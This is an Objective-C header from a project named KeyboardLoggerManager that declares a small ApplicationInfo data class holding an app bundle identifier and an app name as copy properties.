//
//  ApplicationInfo.h
//  KeyboardLoggerManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface ApplicationInfo : NSObject <NSCopying, NSCopying> {
@private
        NSString * mAppBundle;
        NSString * mAppName;
}
@property (nonatomic, copy) NSString * mAppBundle;
@property (nonatomic, copy) NSString * mAppName;
@end
